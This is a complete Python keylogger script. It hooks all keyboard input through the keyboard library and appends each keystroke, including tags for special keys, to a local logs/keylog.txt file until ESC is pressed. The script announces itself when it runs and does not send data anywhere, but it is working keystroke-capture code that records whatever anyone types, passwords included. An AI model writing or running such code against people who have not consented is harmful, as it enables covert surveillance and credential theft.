import keyboard
import time
from datetime import datetime
import os

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")

def create_log_directory():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def on_key_press(event):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                f.write("\n")
            elif event.name == "backspace":
                f.write(" [BACKSPACE] ")
            elif len(event.name) > 1: 
                f.write(f" [{event.name.upper()}] ")
            else:
                f.write(event.name)
    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    create_log_directory()
    
    print("Simple Keylogger started")
    print(f"Logging to: {LOG_FILE}")
    print("Press ESC to stop...")
    
    keyboard.on_press(on_key_press)
    
    keyboard.wait("esc")
    
    keyboard.unhook_all()
    print("\nKeylogger stopped. Goodbye!")

if __name__ == "__main__":
    try:
        start_keylogger()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")